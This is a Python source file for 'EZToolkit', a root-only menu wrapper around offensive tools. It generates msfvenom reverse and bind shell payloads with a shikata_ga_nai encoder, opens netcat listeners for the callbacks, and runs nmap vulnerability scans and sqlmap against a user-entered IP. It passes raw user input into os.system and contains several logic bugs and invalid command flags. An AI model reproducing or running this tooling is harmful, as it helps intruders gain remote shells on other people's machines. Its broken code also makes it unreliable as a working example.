#!/usr/bin/python
#
#                                  [Insert code license information here]
#
#                     _____________  ____________                  ___    ___   ___   ___________
#                    /  _______   / /____   ____/                 /  /   /  / _/ _/  /  __   ___/
#                   /  / __   /  /      /  /  _________________  /  /   /  /_/ _/   /  / /  /
#                  /    __/  /  /      /  /  /  __   //  __   / /  /   /  __  /    /  / /  /
#                 /  /______/  /___   /  /  /  /_/  //  /_/  / /  /___/  / /_ /_  /  / /  /
#                /________________/  /__/  /_______//_______/ /_________/   /__/ /__/ /__/
#
#                                      Code written by Wh1ppedKreem
#                            My Github profile https://github.com/Wh1ppedKreem
#
import os
import re
import base64 as b64

# The class that is responsible for adding colour to this script
class tc:  # tc in this case stands for terminal colours
    BLACK = "\u001b[30m" 
    RED = "\u001b[31m"
    OTHERRED = "\033[91m"
    GREEN = "\u001b[32m"
    YELLOW = "\u001b[33m"
    BLUE = "\u001b[34m"
    MAGENTA = "\u001b[35m"
    CYAN = "\u001b[36m"
    WHITE = "\u001b[37m"
    RESET = "\u001b[0m"

# Regular expression for an IP address
ip_regex_pattern = (r"^(\d{1,3}\.){3}\d{1,3}$")

# This function checks to see if the input by the user matches the regular expression of an IP address
def is_ip_address(ip_address):
    return bool(re.match(ip_regex_pattern, ip_address))

# Regular expression for a port
port_regex_pattern = (r"^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$")

def clearScreen():
    os.system("clear")

# This function checks to see if the input by the user matches the regular expression of a port.
def is_valid_port(portSelection):
    return bool(re.match(port_regex_pattern, portSelection))

# This function takes the users input and displays an error message if it is not valid. Credit for this piece of code goes to https://github.com/HBalable
def get_user_choice(is_valid_option, prompt, invalid_message=None):
    option = input(prompt).strip()
    while not is_valid_option(option):
        if invalid_message is None:
            print(f"Invalid option: {option}")
        else:
            print(invalid_message.format(option=option))
        option = input(prompt).strip()
    return option

# All banners and options start below
# Hand-made ASCII art by me ;)
BANNER = f"""\
{tc.RED}*************************************************************************************
{tc.RED}*      _____________  ____________                  ___    ___   ___   ___________  *
{tc.RED}*     /  _______   / /____   ____/                 /  /   /  / _/ _/  /  __   ___/  *
{tc.RED}*    /  / __   /  /      /  /  _________________  /  /   /  /_/ _/   /  / /  /      *
{tc.RED}*   /    __/  /  /      /  /  /  __   //  __   / /  /   /  __  /    /  / /  /       *
{tc.RED}*  /  /______/  /___   /  /  /  /_/  //  /_/  / /  /___/  / /_ /_  /  / /  /        *
{tc.RED}* /________________/  /__/  /_______//_______/ /_________/   /__/ /__/ /__/         *
{tc.RED}*                                                                                   *
{tc.RED}*                                  11111111                                         *
{tc.RED}*                                111111111111                                       *
{tc.RED}*                                111111111111                                       *
{tc.RED}*                               111  1111  111                                      *
{tc.RED}*                               111   11   111                                      *
{tc.RED}*                                11111 111111                                       *
{tc.RED}*                               111 11  11 111                                      *
{tc.RED}*                                 1 100001 1                                        *
{tc.RED}*                                 1110000111                                        *
{tc.RED}*                                   111111                                          *
{tc.RED}*                                                                                   *
{tc.RED}*                  --------- Coded By Wh1ppedKreem ---------                        *
{tc.RED}*               Follow me on Github: https://github.com/Wh1ppedKreem                *                  
{tc.RED}*                  [!] Do not use this tool for illegal purposes.                   *                
{tc.RED}*************************************************************************************{tc.RESET}
"""

OPTIONS = f"""
{tc.WHITE}
{tc.RED}[1]{tc.RESET} Generate a payload
{tc.RED}[2]{tc.RESET} Scan a network 
{tc.RED}[3]{tc.RESET} SQL Injection
{tc.RED}[4]{tc.RESET} OSINT
{tc.RED}[5]{tc.RESET} DoS attack
{tc.RED}[6]{tc.RESET} Setup a listener
{tc.RED}[7]{tc.RESET} Encode/Decode base64 string
{tc.RED}[8]{tc.RESET} Help
{tc.RED}[9]{tc.RESET} Download the requirements
{tc.YELLOW}[99]{tc.RESET} Quit
{tc.RESET}
"""

NMAPBANNER = f"""
{tc.RED}
 _____  _____ ______ __   _
|_____ |      |____| | \  |
______||_____ |    | |  \_|
{tc.RESET}
"""

NMAPOPTIONS = f"""
Select Scan Intensity: 
{tc.RED}[1]{tc.RESET} Stealth Scan (may take a while)
{tc.RED}[2]{tc.RESET} Light Scan
{tc.RED}[3]{tc.RESET} Moderate Scan
{tc.RED}[4]{tc.RESET} Intense Scan
{tc.RED}[5]{tc.RESET} Super Scan
{tc.YELLOW}[99]{tc.RESET} Return to main menu
{tc.RESET}
"""

SQLINJECTIONBANNER = f"""
{tc.RED}
 _____  _____  _     ___
|_____ |    \| |      |
______||_____\ |____ _|_
{tc.RESET}
"""

SQLINJECTIONOPTIONS = f"""
{tc.RED}[1]{tc.RESET} Light Scan
{tc.RED}[2]{tc.RESET} Moderate Scan
{tc.RED}[3]{tc.RESET} Intense Scan
{tc.RED}[4]{tc.RESET} Super Scan
{tc.YELLOW}[99]{tc.RESET} Return to main menu
{tc.RESET}
"""

BASE64BANNER = f"""
{tc.RED}
 _____ ______ _____  _____  ______ _   _
|_____||____||_____ |_____  |_____ |___|
|_____||    | _____||_____  |_____|    |
            Decoder/Encoder
{tc.RESET}
"""

# Main Function
def main():
    print(BANNER)
    while True:
        if os.geteuid() != 0:
            print(f"{tc.YELLOW}[!] EZToolkit requires root privelages! Try running \"Run sudo python3 eztoolkit.py\" to fix your issue.{tc.RESET}")
            quit()
        print(OPTIONS)
        choice = int(input("Enter an option [1-9] [99 to exit]: "))

        # Quit option
        if choice == 99:
            print("Quitting...")
            quit()

        # Requirements' download script starts here
        if choice == 9:
            operatingSystem = int(input("Are you on [1]windows, [2]mac or [3]linux? (type corresponding numbers): "))
            if operatingSystem == 1:
                print("Add manually for now.")
            elif operatingSystem == 2:
                print("Add manually for now.")
            elif operatingSystem == 3:
                importantupdatechoice = int(input("Are you using an [1]Debian-based distro or [2]Arch-based distro: "))
                if importantupdatechoice == 1:
                    os.system("wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run")
                    os.system("chmod +x ./metasploit-latest-linux-x64-installer.run")
                    os.system("./metasploit-latest-linux-x64-installer.run")
                    os.system("apt install nmap")
                    os.system("apt install sqlmap")
                    os.system("apt install perl")
                    os.system("apt install netcat")
                    clearScreen()
                elif importantupdatechoice == 2:
                    print("I have no clue how to install metasploit on Arch-based distros.")
                    os.system("pacman -S nmap")
                    os.system("pacman -S sqlmap")
                    os.system("pacman -S perl")
                    os.system("pacman -S netcat")
                    clearScreen()
                elif (operatingSystem > 3) or (operatingSystem == ""):
                    print(f"{tc.RED}[!] Unsupported/Invalid option.{tc.RESET}")
                else:
                    break
        
        # Listener option
        if choice == 6:
            mainListenerChoice = input("Enter port for listener >>> ")
            os.system(f"nc -nvlp {mainListenerChoice}")
        
        # msfvenom payload + netcat listener scripts start here 
        if choice == 1:
            clearScreen()
            print(f"{tc.GREEN}Your payload will automatically be encoded with shikata_ga_nai{tc.RESET}")
            msfvPlatform = input("Type a valid operating system for the payload[windows/mac/linux/android]: ")
            reverseConnection = input("Pick between [reverse_tcp], [bind_tcp], [reverse_http], [reverse_https] (type EXACTLY as shown or the command will fail): ")
            lhost = get_user_choice(
                is_ip_address, 
                "Enter LHOST: ",
                f"{tc.YELLOW}Invalid IP address, try again.{tc.RESET}"
            )
            lport = get_user_choice(
                is_valid_port,
                "Enter LPORT: ",
                f"{tc.YELLOW}Invalid port, try again.{tc.RESET}"
            )
            payloadExtension = input("Enter a file extension for the payload [py/exe/sh/or any other compatible] (type EXACTLY as shown): ")
            payloadName = input("Enter a name for the payload: ")
            os.system(f"msfvenom --platform {msfvPlatform} -p {msfvPlatform}/shell/{reverseConnection} lhost={lhost} lport={lport} -e x86/shikata_ga_nai -b \"badchars\" -f {payloadExtension} > {payloadName}.{payloadExtension}")
            listenerChoice = str(input("Would you like to setup a listener? [y/n]: "))
            if (listenerChoice == "y") or (listenerChoice == "Y"):
                listenerPort = get_user_choice(
                is_valid_port, 
                "Enter the port for the listener >>> ", 
                f"{tc.YELLOW}Invalid port, try again.{tc.RESET}"
                )
                os.system(f"nc -nvlp {listenerPort}")
            elif (listenerChoice == "n") or (listenerChoice == "N"):
                print("No listener has been set.")
                return main()
            elif listenerChoice != ("y", "Y", "n", "N"):
                print("Invalid Option - returning to main menu.")
                return main()
        # Nmap script starts here
        elif choice == 2:
            print(NMAPBANNER, NMAPOPTIONS)
            nmapChoice = int(input("Enter a choice [1-5] [99 to return to main menu]: "))
            # Returns to main menu
            if nmapChoice == 99:
                return main()
            # Prompts user to input desired IP address
            ip_address = get_user_choice(
                is_ip_address, 
                "Enter the IP address you would like to scan >>> ", 
                f"{tc.YELLOW}Invalid IP address, try again.{tc.RESET}"
            )
            # Prompts user to input desired port
            nmapPortSelection = get_user_choice(
                is_valid_port, 
                "Enter the port you would like to scan >>> ", 
                "Invalid port, try again."
            )
            if nmapChoice == 1:
                # Stealth Scan
                portQuery = input("Would you like to [1] scan a specific port or [2] all ports? >>> ")
                if portQuery == 1:
                    os.system(f"nmap -T1 {ip_address} -p {nmapPortSelection}")
                elif portQuery == 2:
                    os.system(f"nmap -T1 {ip_address}")
            elif nmapChoice == 2:
                # Light Scan
                os.system(f"nmap -T3 {ip_address} -p {nmapPortSelection}")
            elif nmapChoice == 3:
                # Moderate Scan
                os.system(f"nmap -sC -sV -O {ip_address} -p {nmapPortSelection}")
            elif nmapChoice == 4:
                # Intense Scan
                os.system(f"nmap -sC -sV -O --script vuln -T6 {ip_address} -p {nmapPortSelection}")
            elif choice == 5:
                # Super Scan
                verbosity_level = input("Select the level of verbosity (the mount of info shown) (1/2/3) >>> ")
                verbosity_args = f"-{'v'*{verbosity_level}}"
                os.system(f"nmap -sC -sV -O --script vuln -T6 {verbosity_args} {ip_address} -p {nmapPortSelection}")
            else:
                # Returns to the beginning of the function once complete
                return main()
        elif choice == 3:
            print(SQLINJECTIONBANNER, SQLINJECTIONOPTIONS)
            sqlChoice = int(input("Enter a choice [1-4] [99 to return to main menu]"))
            # Returns to main menu
            if sqlChoice == 99:
                return main()
            # Prompts user to input desired IP address
            ip_address = get_user_choice(
                is_ip_address,
                "Enter the IP address you would like to attack >>> ",
                "Invalid IP address, try again."
            )
            if sqlChoice == 1:
                # Light Scan
                os.system(f"sqlmap {ip_address} --abs")

        elif choice == 7:
            print(BASE64BANNER)
            base64choice = int(input("Would you like to [1]encode or [2]decode a string? >>> "))
            if base64choice == 1:
                base64DecodedString = str(input("Enter the string you would like to encode in base64: "))
                base64DecodedString_bytes = base64DecodedString.encode("ascii")
                base64EncodedString = b64.b64encode(base64DecodedString_bytes)
                base64EncodedString_bytes = base64EncodedString.decode("ascii")
                print("Your encoded string is: ")
                print(f"{tc.GREEN}{base64EncodedString_bytes}{tc.RESET}")
            elif base64choice == 2:
                base64encodedstring = str(input("Enter the string you would like to decode from base64: "))
                base64encodedstring_bytes = base64encodedstring.encode("ascii")
                base64decodedstring = b64.b64decode(base64encodedstring_bytes)
                base64decodedstring_bytes = base64decodedstring.decode("ascii")
                print("Your decoded string is: ")
                print(f"{tc.GREEN}{base64decodedstring_bytes}{tc.RESET}")



if __name__ == "__main__":
    main()
